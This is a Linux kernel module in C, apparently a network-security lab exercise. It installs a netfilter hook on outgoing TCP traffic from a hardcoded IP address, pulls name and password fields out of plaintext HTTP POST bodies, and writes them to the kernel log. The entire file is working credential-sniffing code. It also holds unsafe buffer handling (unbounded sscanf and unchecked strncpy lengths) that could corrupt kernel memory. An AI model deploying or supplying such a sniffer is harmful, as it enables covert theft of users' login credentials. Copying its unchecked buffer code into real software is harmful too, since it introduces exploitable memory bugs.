#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/in.h>

#define MAXLINE (1 << 10)
/* (unsigned int)ip */
#define SELF_IP 2486479040

unsigned int get_password(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
char *get_body(char *payload);
void parse_body(char *body, char *name, char *password);

/* 包含hook点回调函数的数据结构 */
struct nf_hook_ops nf_hk;

int my_init_module(void)
{
    printk(KERN_INFO "insert password module\n");
    nf_hk.priv = NULL;
    nf_hk.hook = get_password;
    /* 本机发送 */
    nf_hk.hooknum = NF_INET_LOCAL_OUT;
    /* ipv4 */
    nf_hk.pf = PF_INET;
    /* 优先级 */
    nf_hk.priority = NF_IP_PRI_FIRST;
    /* 注册 */
    nf_register_net_hook(&init_net, &nf_hk);
    return 0;
}

void my_exit_module(void)
{
    printk(KERN_INFO "remove password module\n");
    /* 注销 */
    nf_unregister_net_hook(&init_net, &nf_hk);
}

/*
 * hook函数，处理数据包
 * priv:   private data
 * skb:    skbuf
 * state:  hook点 + 协议族 + 设备 + ...
 */
unsigned int get_password(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
#ifdef DEBUG
    static int a=0;
    a++;
    printk("get password function trigger %d",a);
#endif

    if (skb == NULL)
    {
        printk(KERN_INFO "skbuf error.\n");
        return NF_ACCEPT;
    }
    /* TCP协议 + 载荷不为0 + 主机发出的包 */
    struct iphdr *ip_header = ip_hdr(skb);
    if (ip_header->protocol != IPPROTO_TCP || skb->data_len == 0 || ip_header->saddr != SELF_IP)
    {
        return NF_ACCEPT;
    }

    /*
     * payload = 应用层数据 = http request line + header + body
     * method uri version = http request line
     */
    char payload[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];
    memset(payload, 0, MAXLINE);

    /* 从skbuf中读payload */
    skb_copy_bits(skb, skb->len - skb->data_len, payload, min(skb->data_len, MAXLINE));
    /* 取出首行的 method uri version，每行都是\r\n结尾 */
    sscanf(payload, "%s %s %s", method, uri, version);

    /* 报文中用户名和密码形式为：&name=......&password=.......& */
    char name[MAXLINE];
    char password[MAXLINE];
    memset(name, 0, MAXLINE);
    memset(password, 0, MAXLINE);

   
    /* POST请求，这里直接从body开始扫描 */
    if (!strcmp(method, "POST"))
    {
        /* 请求报头后的主体 */
        char *body;
        if ((body = get_body(payload)) == NULL)
        {
            printk("http request header error.\n");
            return NF_ACCEPT;
        }
        parse_body(body, name, password);
        // parse_body(payload, name, password);
        if (strlen(name) != 0 && strlen(password) != 0)
        {
            printk(KERN_INFO "name = %s\n", name);
            printk(KERN_INFO "password = %s\n", password);
        }
    }
    return NF_ACCEPT;
}

/* 返回payload中的主体位置的指针 */
char *get_body(char *payload)
{
    /*
     * 每行结尾都是\r\n，最后一行为空行+\r\n
     * 所以body部分就在"\r\n\r\n"后面
     */
    char *ptr = strstr(payload, "\r\n\r\n");
    if (ptr == NULL)
    {
        return NULL;
    }
    return ptr + 4;
}

/* 分析body部分找到name和password */
void parse_body(char *body, char *name, char *password)
{
    /* strstr:返回子串首次出现的位置 */
    char *name_ptr = strstr(body, "&name=");
    if (name_ptr != NULL)
    {
        /* 指针调整到name的首位 */
        name_ptr += 6;
    }
    else
    {
        return;
    }

    /* password开始位置 */
    char *password_ptr = strstr(name_ptr, "&password=");
    if (password_ptr != NULL)
    {
        password_ptr += 10;
    }
    else
    {
        return;
    }

    /* 结束位置 */
    char *end_ptr = strstr(password_ptr, "&");
    if (name_ptr != NULL && password_ptr != NULL && end_ptr != NULL)
    {
        /* 分别计算name和password的长度，再进行拷贝 */
        int name_len = password_ptr - name_ptr - 10;
        int password_len = end_ptr - password_ptr;
        strncpy(name, name_ptr, name_len);
        strncpy(password, password_ptr, password_len);
    }
}

module_init(my_init_module);
module_exit(my_exit_module);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("adeshen");